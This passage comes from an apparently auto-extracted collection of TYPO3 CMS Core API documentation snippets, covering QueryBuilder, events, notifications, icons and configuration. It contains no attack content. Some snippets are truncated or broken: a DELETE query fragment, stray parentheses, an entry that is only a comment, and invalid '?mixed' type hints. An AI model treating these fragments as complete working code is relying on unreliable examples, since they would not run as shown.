https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/EventApi/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nimport RegularEvent from '@typo3/core/event/regular-event.js';\n\nnew RegularEvent('click', function(e) {\n  // Your code\n}).bindTo(document.querySelector('.my-button'));\n```\n\n----------------------------------------\n\nTITLE: Executing DELETE Query with QueryBuilder in TYPO3 CMS\nDESCRIPTION: Demonstrates how to create and execute a DELETE query using the QueryBuilder. It includes setting the table, conditions, and executing the statement.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_10\n\nLANGUAGE: PHP\nCODE:\n```\n$queryBuilder->expr()->eq('bodytext', $queryBuilder->createNamedParameter('lorem', Connection::PARAM_STR))\n        )\n        ->executeStatement();\n```\n\n----------------------------------------\n\nTITLE: Flushing Redis Cache by Tag in PHP\nDESCRIPTION: PHP method reference for the RedisBackend::flushByTag() function that is used to flush cache entries by tag in Redis backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/FrontendsBackends/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nRedisBackend::flushByTag()\n```\n\n----------------------------------------\n\nTITLE: Using PageTypeSource in Custom Event Listener (PHP)\nDESCRIPTION: This snippet demonstrates how to create a custom event listener that uses the PageTypeSource to add redirect sources for non-zero page types. It implements the SlugRedirectChangeItemCreatedEvent and adds sources for page types 1 and 2.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Redirects/SlugRedirectChangeItemCreatedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Redirects\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Attribute\\AsEventListener;\nuse TYPO3\\CMS\\Redirects\\Event\\SlugRedirectChangeItemCreatedEvent;\nuse TYPO3\\CMS\\Redirects\\RedirectUpdate\\PageTypeSource;\n\n#[AsEventListener(\n    identifier: 'my-extension/add-page-type-sources'\n)]\nfinal class MyEventListener\n{\n    public function __invoke(SlugRedirectChangeItemCreatedEvent $event): void\n    {\n        foreach ([1, 2] as $pageType) {\n            $event->addSource(new PageTypeSource($pageType));\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: HTML Content Example with Multiple Soft References\nDESCRIPTION: Sample HTML content showing different types of soft references including page links, URLs, and email addresses.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SoftReferences/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<p><a href=\"t3://page?uid=96\">Congratulations</a></p>\n<p>To read more about <a href=\"https://example.org/some-cool-feature\">this cool feature</a></p>\n<p>Contact: email@example.org</p>\n```\n\n----------------------------------------\n\nTITLE: Retrieving All Countries in TYPO3 Country API\nDESCRIPTION: Shows how to get all countries using the CountryProvider's getAll() method in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Country/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$allCountries = $this->countryProvider->getAll();\n```\n\n----------------------------------------\n\nTITLE: Implementing ImmediateAction with ES6 modules in TYPO3 Notification API\nDESCRIPTION: Example showing how to implement an ImmediateAction in the TYPO3 Notification API using ES6 modules. ImmediateAction is used for simple actions executed directly on click that close the notification.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlashMessages/NotificationApi.rst#2025-04-16_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nimport Notification from '@typo3/backend/notification';\nimport ImmediateAction from '@typo3/backend/action-button/immediate-action';\n\nNotification.info(\n  'Update required', \n  'The system requires an update.',\n  0,\n  [\n    {\n      label: 'Execute update',\n      action: new ImmediateAction(() => {\n        window.location.href = 'update.php';\n      })\n    }\n  ]\n);\n\n```\n\n----------------------------------------\n\nTITLE: Defining Default Configuration in TYPO3\nDESCRIPTION: This snippet represents the default configuration settings provided by TYPO3. It offers essential settings such as image processing parameters and support for various file formats. This array acts as the baseline for TYPO3 global configurations, which can be overwritten by more specific settings in other configuration files.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nreturn [\n    'GFX' => [\n        'thumbnails' => true,\n        'thumbnails_png' => true,\n        'gif_compress' => true,\n        'imagefile_ext' => 'gif,jpg,jpeg,tif,tiff,bmp,pcx,tga,png,pdf,ai,svg',\n        // ...\n    ],\n    // ...\n];\n```\n\n----------------------------------------\n\nTITLE: Using ExpressionBuilder::if() in TYPO3 QueryBuilder (PHP)\nDESCRIPTION: Demonstrates the usage of the if() function in TYPO3's QueryBuilder to create a conditional expression. It checks if the 'hidden' field is 0 and returns 'page-is-visible' or 'page-is-not-visible' accordingly.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/Index.rst#2025-04-16_snippet_11\n\nLANGUAGE: PHP\nCODE:\n```\n$queryBuilder->expr()->if(\n    $queryBuilder->expr()->eq(\n        'hidden',\n        $queryBuilder->createNamedParameter(0, Connection::PARAM_INT)\n    ),\n    $queryBuilder->quote('page-is-visible'),\n    $queryBuilder->quote('page-is-not-visible'),\n    'result_field_name'\n),\n)\n->from('pages');\n```\n\nLANGUAGE: SQL\nCODE:\n```\nSELECT\n    (IF(`hidden` = 0, 'page-is-visible', 'page-is-not-visible')) AS `result_field_name`\n    FROM `pages`\n```\n\n----------------------------------------\n\nTITLE: Adding Local Extension Repository to Project Composer Configuration\nDESCRIPTION: JSON configuration to add the local extensions directory as a repository in the project's composer.json file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Kickstart/Make/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"name\": \"my-vendor/my-project\",\n    \"repositories\": {\n        \"0_packages\": {\n            \"type\": \"path\",\n            \"url\": \"src/extensions/*\"\n        }\n    },\n    \"...\": \"...\"\n}\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyLinkExplanationEvent Class in PHP for TYPO3 CMS Backend Form\nDESCRIPTION: This snippet defines the ModifyLinkExplanationEvent class in the TYPO3\\CMS\\Backend\\Form\\Event namespace. It includes methods for retrieving and modifying link data, parts, and explanations used in FormEngine for link fields.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyLinkExplanationEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Backend\\Form\\Event;\n\nclass ModifyLinkExplanationEvent\n{\n    public function getLinkData(): array\n    {\n        // Implementation not shown\n    }\n\n    public function getLinkParts(): array\n    {\n        // Implementation not shown\n    }\n\n    public function getElementData(): array\n    {\n        // Implementation not shown\n    }\n\n    public function getLinkExplanation(): array\n    {\n        // Implementation not shown\n    }\n\n    public function setLinkExplanation(array $linkExplanation): void\n    {\n        // Implementation not shown\n    }\n\n    public function getLinkExplanationValue(string $key, ?mixed $default = NULL): ?mixed\n    {\n        // Implementation not shown\n    }\n\n    public function setLinkExplanationValue(string $key, ?mixed $value): void\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using ExpressionBuilder::trim() in TYPO3 Repository (PHP)\nDESCRIPTION: Illustrates various uses of the trim() function in a TYPO3 repository to remove leading, trailing, or both leading and trailing characters from a string. It demonstrates creating SELECT statements with different trim operations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/Index.rst#2025-04-16_snippet_18\n\nLANGUAGE: PHP\nCODE:\n```\npublic function findTrimmedValues(): array\n{\n    $queryBuilder = $this->connectionPool->getQueryBuilderForTable('my_table');\n    $queryBuilder\n        ->select('uid')\n        ->addSelect(\n            $queryBuilder->expr()->trim('title'),\n            'trimmed_title'\n        )\n        ->addSelect(\n            $queryBuilder->expr()->trim('title', TrimMode::LEADING, 'a'),\n            'left_trimmed_title'\n        )\n        ->addSelect(\n            $queryBuilder->expr()->trim('title', TrimMode::TRAILING, 'a'),\n            'right_trimmed_title'\n        )\n        ->addSelect(\n            $queryBuilder->expr()->trim('title', TrimMode::BOTH, 'a'),\n            'both_trimmed_title'\n        )\n        ->from('my_table');\n\n    return $queryBuilder->executeQuery()->fetchAllAssociative();\n}\n```\n\n----------------------------------------\n\nTITLE: Using Notification API with ES6 modules in TYPO3 Backend\nDESCRIPTION: Example of using the Notification API in TYPO3 backend with ES6 module syntax to display various flash message types with different parameters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlashMessages/NotificationApi.rst#2025-04-16_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport Notification from '@typo3/backend/notification';\n\n// Show a notice (blue)\nNotification.notice('Notice', 'This is a notice message');\n\n// Show an info (blue)\nNotification.info('Information', 'Some useful information');\n\n// Show a success message (green)\nNotification.success('Well done', 'The action was executed successfully.');\n\n// Show a warning (yellow)\nNotification.warning('Warning', 'Something went wrong.');\n\n// Show an error (red)\nNotification.error('Error', 'This action cannot be executed.');\n\n// A notification that will not disappear\nNotification.success('So awesome', 'The notification will stay forever!', 0);\n\n```\n\n----------------------------------------\n\nTITLE: Implementing RecordAccessGrantedEvent Event Listener in TYPO3 CMS\nDESCRIPTION: An example implementation of an event listener for the RecordAccessGrantedEvent in TYPO3 CMS. This listener can be used to control access to records or modify records before access is evaluated.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Domain/RecordAccessGrantedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Domain\\Access;\n\nuse TYPO3\\CMS\\Core\\Domain\\Access\\RecordAccessGrantedEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(RecordAccessGrantedEvent $event): void\n    {\n        // Called once for each record access check\n        // You can:\n        // * Modify the record via $event->getRecord() and $event->setRecord()\n        // * Skip regular access check and always grant access via $event->setAccessGranted(true)\n        // * Skip regular access check and always deny access via $event->setAccessGranted(false)\n\n        // Example: Always grant access to records with specific title\n        $record = $event->getRecord();\n        if (($record['title'] ?? '') === 'Public Record') {\n            $event->setAccessGranted(true);\n        }\n\n        // Example: Modify a record before access is checked\n        if ($event->getTable() === 'pages') {\n            $record = $event->getRecord();\n            // Add some information\n            $record['modified_by_event'] = true;\n            $event->setRecord($record);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing CountryProvider with Dependency Injection in TYPO3\nDESCRIPTION: Demonstrates how to use dependency injection to retrieve the CountryProvider class in a TYPO3 extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Country/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace MyVendor\\MyExtension;\n\nuse TYPO3\\CMS\\Core\\Country\\CountryProvider;\n\nclass MyClass\n{\n    protected CountryProvider $countryProvider;\n\n    public function __construct(CountryProvider $countryProvider)\n    {\n        $this->countryProvider = $countryProvider;\n    }\n\n    public function myMethod(): void\n    {\n        // Use $this->countryProvider here\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Injecting PageRenderer in a TYPO3 Class\nDESCRIPTION: Example of a PHP class that demonstrates how to use Dependency Injection to inject the PageRenderer in a TYPO3 extension class for managing assets.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Assets/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension;\n\nuse TYPO3\\CMS\\Core\\Page\\PageRenderer;\n\nclass MyClass\n{\n    protected PageRenderer $pageRenderer;\n\n    public function __construct(PageRenderer $pageRenderer)\n    {\n        $this->pageRenderer = $pageRenderer;\n    }\n\n    public function addMyJavaScript(): void\n    {\n        // Add JavaScript file to footer\n        $this->pageRenderer->addJsFooterFile(\n            'EXT:my_extension/Resources/Public/JavaScript/foo.js'\n        );\n        \n        // Add inline JavaScript code to header\n        $this->pageRenderer->addJsInlineCode(\n            'my_extension_js',\n            'console.log(\"Hello World\");'\n        );\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: CustomFileControlsEvent Class Definition with Methods\nDESCRIPTION: PHP class that defines the CustomFileControlsEvent with methods for managing file controls in TYPO3's FormEngine. The class provides functionality to add, remove, and modify controls for file fields, as well as access form field metadata.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/CustomFileControlsEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\Form\\Event;\n\nclass CustomFileControlsEvent\n{\n    public function getResultArray(): array {}\n    \n    public function setResultArray(array $resultArray): void {}\n    \n    public function getControls(): array {}\n    \n    public function setControls(array $controls): void {}\n    \n    public function addControl(string $control, string $identifier = ''): void {}\n    \n    public function removeControl(string $identifier): bool {}\n    \n    public function getTableName(): string {}\n    \n    public function getFieldName(): string {}\n    \n    public function getDatabaseRow(): array {}\n    \n    public function getFieldConfig(): array {}\n    \n    public function getFormFieldIdentifier(): string {}\n    \n    public function getFormFieldName(): string {}\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing RTE Content Transformation in TYPO3\nDESCRIPTION: Event listener class that transforms RTE content before database persistence. Converts 'TYPO3' text to '[tag:typo3]' format when saving to database, allowing for special handling in frontend processing.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Html/AfterTransformTextForPersistenceEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Html\\Event\\AfterTransformTextForPersistenceEvent;\n\nfinal class TransformListener\n{\n    public function __invoke(AfterTransformTextForPersistenceEvent $event): void\n    {\n        $value = $event->getHtmlContent();\n        // When RTE content gets saved, transform \"TYPO3\" to \"[tag:typo3]\"\n        $value = str_replace('TYPO3', '[tag:typo3]', $value);\n        $event->setHtmlContent($value);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Definition of ModifyPageLinkConfigurationEvent Class in TYPO3 Frontend\nDESCRIPTION: A PSR-14 event class that allows for modifying page links in TYPO3 CMS. It provides methods to get and set various properties related to the page link including the page itself, query parameters, and fragments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/ModifyPageLinkConfigurationEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Frontend\\Event;\n\nclass ModifyPageLinkConfigurationEvent\n{\n    public function getConfiguration(): array;\n    public function setConfiguration(array $configuration);\n    public function getLinkDetails(): array;\n    public function getPage(): array;\n    public function setPage(array $page);\n    public function getQueryParameters(): array;\n    public function setQueryParameters(array $queryParameters);\n    public function getFragment(): string;\n    public function setFragment(string $fragment);\n    public function pageWasModified(): bool;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Upgrade Wizard for Extbase Plugin Migration in TYPO3\nDESCRIPTION: Creates an upgrade wizard class to migrate existing Extbase plugins from list_type to CType.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/MigrationListType.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Updates;\n\nuse TYPO3\\CMS\\Install\\Updates\\AbstractListTypeToCTypeUpdate;\n\nclass ExtbasePluginListTypeToCTypeUpdate extends AbstractListTypeToCTypeUpdate\n{\n    /**\n     * @return array<string, string>\n     */\n    protected function getListTypeToExtbasePluginMigrationDefinition(): array\n    {\n        return [\n            'examples_pi_example_content' => 'examples_pi_example_content',\n        ];\n    }\n\n    public function getTitle(): string\n    {\n        return 'Migrate plugins of EXT:examples from list_type to CType';\n    }\n\n    public function getDescription(): string\n    {\n        return 'Migrates the list_type based plugins of EXT:examples to new CType based plugins.';\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring TypoScript for RTE Content Parsing\nDESCRIPTION: Demonstrates the usage of lib.parseFunc_RTE for parsing and rendering RTE content in TypoScript. This is used when rendering is done without Fluid templates.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Rte/RenderingInTheFrontend/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: typoscript\nCODE:\n```\nlib.contentElement.default {\n    myContent = TEXT\n    myContent {\n       field = bodytext\n       parsefunc =< lib.parseFunc_RTE\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Validating Alphanumeric Fields with Extbase\nDESCRIPTION: The AlphanumericValidator ensures that a field contains only letters and numbers, which is useful for fields like usernames. Using it with PHP attributes, it validates when fields do not contain any special symbols or spaces. No additional dependencies are specified, and it seamlessly fits with Extbase models and controllers.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/Validators/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n#[Validate(['validator' => 'Alphanumeric'])]\nprotected string $username;\n```\n\n----------------------------------------\n\nTITLE: Setting Language Key for FluidEmail in PHP\nDESCRIPTION: Demonstrates how to set a language key when creating a FluidEmail, which can be used within the Fluid template.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Mail/Index.rst#2025-04-16_snippet_10\n\nLANGUAGE: php\nCODE:\n```\n$email = new FluidEmail();\n$email\n    ->to('contact@example.org')\n    ->assign('language', 'de');\n```\n\n----------------------------------------\n\nTITLE: Registering Invokable Event Listener in TYPO3 Services.yaml\nDESCRIPTION: This example shows how to register an invokable event listener in the Services.yaml file of a TYPO3 extension. The listener class is treated as invokable, so its __invoke() method will be called.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/EventDispatcher/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  MyVendor\\MyExtension\\EventListener\\NullMailer:\n    tags:\n      - name: event.listener\n        event: TYPO3\\CMS\\Core\\Mail\\Event\\BeforeMailerSentMessageEvent\n```\n\n----------------------------------------\n\nTITLE: Limiting Restrictions to Specific Table Aliases in TYPO3\nDESCRIPTION: This code shows how to limit the complete set of restrictions to specific table aliases. The HiddenRestriction is applied only to the 'c2' table alias in a left join query between two tt_content tables.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/RestrictionBuilder/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n$queryBuilder->getRestrictions()\n    ->removeAll()\n    ->add(GeneralUtility::makeInstance(HiddenRestriction::class));\n$queryBuilder->getRestrictions()->limitRestrictionsToTables(['c2']);\n$queryBuilder\n    ->select('c1.*')\n    ->from('tt_content', 'c1')\n    ->leftJoin('c1', 'tt_content', 'c2', 'c1.parent_field = c2.uid')\n    ->orWhere(\n        $queryBuilder->expr()->isNull('c2.uid'),\n        $queryBuilder->expr()->eq(\n            'c2.pid',\n            $queryBuilder->createNamedParameter(1, Connection::PARAM_INT)\n        )\n    );\n```\n\n----------------------------------------\n\nTITLE: Setting Frontend Restrictions in TYPO3\nDESCRIPTION: Shows how to replace the default restriction container with the frontend-specific restriction container. This is commonly needed in frontend contexts to apply the appropriate visibility rules.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/RestrictionBuilder/Index.rst#2025-04-16_snippet_11\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Query\\Restriction\\FrontendRestrictionContainer\n// Remove default restrictions and add list of default frontend restrictions\n$queryBuilder->setRestrictions(GeneralUtility::makeInstance(FrontendRestrictionContainer::class));\n```\n\n----------------------------------------\n\nTITLE: Configuring External CSP Reporting URL in TYPO3\nDESCRIPTION: This snippet shows how to configure an external Content Security Policy reporting URL for both backend and frontend contexts in TYPO3. This redirects CSP violation reports to a third-party service instead of using the built-in TYPO3 reporting endpoint.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentSecurityPolicy/Index.rst#2025-04-16_snippet_13\n\nLANGUAGE: php\nCODE:\n```\n// For backend\n$GLOBALS['TYPO3_CONF_VARS']['BE']['contentSecurityPolicyReportingUrl']\n    = 'https://csp-violation.example.org/';\n\n// For frontend\n$GLOBALS['TYPO3_CONF_VARS']['FE']['contentSecurityPolicyReportingUrl']\n    = 'https://csp-violation.example.org/';\n```\n\n----------------------------------------\n\nTITLE: Injecting Database Connection Directly in TYPO3 Repository\nDESCRIPTION: Example of constructor injection for a specific database connection in a repository class. This approach is suitable when a repository only works with a single table.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Connection/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Domain\\Repository;\n\nuse TYPO3\\CMS\\Core\\Database\\Connection;\n\nfinal class MyTableRepository\n{\n    public function __construct(\n        private readonly Connection $connection,\n    ) {\n    }\n\n    public function someMethod(): void\n    {\n        // Do something with the connection\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Using FlashMessageRendererResolver in TYPO3 Extension\nDESCRIPTION: This snippet shows how to use the new FlashMessageRendererResolver class in a TYPO3 extension. It resolves the appropriate renderer based on the context and uses it to render flash messages.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlashMessages/Render.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\nuse TYPO3\\CMS\\Core\\Messaging\\FlashMessageRendererResolver;\n\n$out = GeneralUtility::makeInstance(FlashMessageRendererResolver::class)\n   ->resolve()\n   ->render($flashMessages);\n```\n\n----------------------------------------\n\nTITLE: Registering a Feature Toggle in Extension Configuration\nDESCRIPTION: Shows how to register a custom feature toggle and set its default state in an extension's ext_localconf.php file. This creates a new feature toggle with a default value that can be overridden by site configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FeatureToggleApi/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['features']['myFeatureName'] ??= true; // or false;\n```\n\n----------------------------------------\n\nTITLE: Defining Main Data Structure with External Sheet References in TYPO3 FlexForms\nDESCRIPTION: Shows how to reference external files for individual sheets in a TYPO3 Data Structure. This allows splitting complex FlexForm structures into multiple files for better maintainability.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlexForms/T3datastructure/SheetReferences/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<T3DataStructure>\n    <sheets>\n        <sDEF>EXT:my_extension/Configuration/FlexForms/sheets/default_sheet.xml</sDEF>\n        <s_welcome>EXT:my_extension/Configuration/FlexForms/sheets/welcome_sheet.xml</s_welcome>\n    </sheets>\n</T3DataStructure>\n```\n\n----------------------------------------\n\nTITLE: Minimal CLI Request Configuration in TYPO3\nDESCRIPTION: Demonstrates how to set up a basic CLI request with applicationType and site attributes for generating links and using FluidEmail in TYPO3 console commands. Shows initialization of minimal frontend context for CLI operations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CommandControllers/Tutorial.rst#2025-04-16_snippet_9\n\nLANGUAGE: PHP\nCODE:\n```\n// packages/my_extension/Classes/Command/DoBackendRelatedThingsCommand.php\n```\n\n----------------------------------------\n\nTITLE: Registering a Hook in TYPO3 CMS in ext_localconf.php\nDESCRIPTION: Example of how to register a hook for clear-cache post-processing in TYPO3. This code adds a custom processor that will be called whenever a cache is cleared for a specific page.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Hooks/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SC_OPTIONS']['t3lib/class.t3lib_tcemain.php']['clearCachePostProc'][] =\n    \\Vendor\\Extension\\Hooks\\DataHandlerHook::class . '->postProcessClearCache';\n```\n\n----------------------------------------\n\nTITLE: Generating Backend URLs in TYPO3 Fluid Templates\nDESCRIPTION: Example of generating backend URLs in Fluid templates using the 'f:be.link' ViewHelper. Shows linking to standard modules, custom modules, and specific controller actions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendRouting.rst#2025-04-16_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<f:be.link route=\"web_layout\" parameters=\"{id:42}\">go to page 42</f:be.link>\n<f:be.link route=\"web_ExtkeyExample\">go to custom BE module</f:be.link>\n<f:be.link route=\"web_ExtkeyExample.MyModuleController_list\">\n    go to custom BE module but specific controller action\n</f:be.link>\n```\n\n----------------------------------------\n\nTITLE: Implementing Security Gate in TYPO3 Extension Files\nDESCRIPTION: Required security gate code that must be placed at the beginning of extension PHP files (ext_localconf.php, ext_tables.php, and files in Configuration/TCA/Overrides/) to prevent direct HTTP access. This pattern checks if the TYPO3 constant is defined before allowing execution.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/GlobalValues/Constants/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndefined('TYPO3') or die();\n\n// ... your code\n```\n\n----------------------------------------\n\nTITLE: Registering Icons in TYPO3 Configuration File\nDESCRIPTION: This snippet demonstrates how to register custom icons in TYPO3 by creating a Configuration/Icons.php file in your extension. It shows how to use both bitmap and SVG icon providers with proper configuration array structure.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Icon/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nreturn [\n    // Icon identifier\n    'tx-myext-example' => [\n        // Icon provider class\n        'provider' => \\TYPO3\\CMS\\Core\\Imaging\\IconProvider\\BitmapIconProvider::class,\n        // The options of the provider\n        'options' => [\n            // Path to the icon file, relative to the extension\n            'source' => 'EXT:my_extension/Resources/Public/Icons/Example.gif',\n        ],\n    ],\n    'tx-myext-svgicon' => [\n        'provider' => \\TYPO3\\CMS\\Core\\Imaging\\IconProvider\\SvgIconProvider::class,\n        'options' => [\n            'source' => 'EXT:my_extension/Resources/Public/Icons/example.svg',\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Accessing Request Object in Extbase Controller\nDESCRIPTION: Example of accessing the PSR-7 request object and its attributes within an Extbase controller action.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/Typo3Request.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse Psr\\Http\\Message\\ResponseInterface;\nuse TYPO3\\CMS\\Extbase\\Mvc\\Controller\\ActionController;\n\nfinal class MyController extends ActionController\n{\n    // ...\n\n    public function myAction(): ResponseInterface\n    {\n        // ...\n\n        // Retrieve the language attribute via the request object\n        $language = $this->request->getAttribute('language');\n\n        // ...\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Extbase Controller Forward Action\nDESCRIPTION: This example demonstrates how to forward from one controller action to another using `\\TYPO3\\CMS\\Extbase\\Http\\ForwardResponse`. It shows how to forward to the `indexAction` of the `BlogController` if the current blog is not found in the `indexAction` of the `PostController`. The target controller and action need to be registered.\nSOURCE: 